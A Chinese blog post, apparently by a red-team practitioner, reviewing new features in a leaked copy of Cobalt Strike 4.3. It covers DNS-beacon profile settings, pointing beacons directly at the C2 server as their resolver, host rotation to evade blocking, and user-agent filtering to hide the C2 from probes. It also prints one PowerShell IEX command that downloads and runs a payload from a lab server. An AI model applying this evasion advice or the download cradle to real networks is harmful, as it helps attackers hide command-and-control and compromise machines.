攻防演练期间，有公众号在分享相关内容。果然发现`Cobalt Strike 4.3 (March 3, 2021)
02fa5afe9e58cb633328314b279762a03894df6b54c0129e8a979afcfca83d51`被泄露了。于是演练结束了便结合更新日志看了一下新功能，发现部分还是挺实用的。简单介绍一下：

## 一些新功能

  * Added support for dns-beacon Malleable C2 group.  
Added options for DNS Host
Indicators:beacon,get_A,get_AAAA,get_TXT,put_metadata,put_output  
Malleable C2 Lint changes to support dns-beacon group.

### DNS隧道逃避检测能力提升与配置：

  1. 新版本profile文件中的DNS隧道相关配置要放到dns-beacon{}里了。同时./c2lint（调用c2profile.Lint方法检查profile文件合法性的脚本）也同步更新。

  2. 新版本可以在profile文件中自定义原先dns隧道通信中固定的www、api、www6等子域名前缀了。相关修改可以参考 https://github.com/threatexpress/malleable-c2/blob/d2d443af48bd8d026d5eedfe6a09f2d167d94c5e/jquery-c2.4.3.profile 中 L190-L210中内容。

  * Allow DNS Beacons to egress directly through a specified DNS Resolver,  
rather than using the default resolver from the target server.

### 允许beacon通信使用指定的DNS服务器

允许beacon通信使用指定的DNS服务器，所以这里就能这么玩了。![image.png](https://image.3001.net/images/20210429/1619709808_608acf70d8b074eed5381.png!small)域名随意填写，DNS服务器直接写CS服务器地址。（不再强制需要域名解析服务器指向）但是值得注意的是，stage分发并不能使用该功能。所以在使用stageless模式生成client时，可以任意填写域名进行通信交互，不过我们的CS服务器也会暴露。至于中转什么的，那就另说了。

  * Host Rotation Strategy for customizing host selection for DNS/HTTP/HTTPS beacons.

### 在beacon通信时，可以选择更多的轮询方案以逃避检测、阻断

这点在dns、https、http监听器中都有体现。  
也就是这个选项  
![image.png](https://image.3001.net/images/20210429/1619710410_608ad1ca4de6225217415.png!small)  
之前版本默认为轮询，现在可以选择
轮询、随机、失败X[次|时间]后进行更换、固定时间进行更换。同样的，和stage分发无关。stage分发可以选择独立的host。

  * Allow HTTP/HTTPS configuration of blocked useragent (previously curl/lynx/wget).  
Added .http-config.block_useragents to Malleable C2.

### 允许在配置文件中ban掉指定UA的请求

允许在profile文件中指定.http-config.block_useragents选项以ban掉部分请求。个人觉得可以用黑名单来实行白名单。只允许profile中设置的UA通信就好了，防止恶意探测。

  * Add support for responding to NS request from specific DNS resolvers.  
Added .dns-beacon.ns_response Malleable C2 option.  
为NS类型的DNS请求添加响应。这个 没get到点在哪里、、

  * Add timestamp to beacon console messages.  
The timestamp option can be enabled/disabled in Preferences (Console tab).  
The timestamp format can be modified with aggressor script.  
See BEACON_CONSOLE_TIMESTAMP and SSH_CONSOLE_TIMESTAMP in default.cna.  
可以选择在控制台中消息的时间部分以时间戳或者可读时间显示。同样没有get到。。

  * Add a PowerShell IEX option in Scripted Web Delivery  
添加了一个使用powershell一键上线的命令，也就是这个功能。![image.png](https://image.3001.net/images/20210429/1619710880_608ad3a0d4fdba35f6ca8.png!small)  
生成的结果为 IEX ((new-object
net.webclient).downloadstring('http://192.168.80.128:80/a'))

## bug修复部分

>   * Fixed sleep command after exit causing beacons not to exit.
>
>   * Malleable C2 lint was incorrectly showing jitter data in staging
> preview.
>
>   * Fixed invalid help link (attacks->packages->Windows Executable)
>
>   * Setting sleep to 0 in Malleable C2 caused beacons to fail.  
> Add C2 Lint range for sleep values.
>
>   * Fix data_jitter issue not using any jitter when it was longer than limit
> (921600).  
> Added minimum data_jitter (10) and performance warning for over 10000.  
> Show data_jitter marker in C2 Lint preview data rather than actual jitter
> data.  
> 以上是修复的bug部分，不再展开细说。
>
>

好了，就是这样。如有理解错误，请不吝指正。

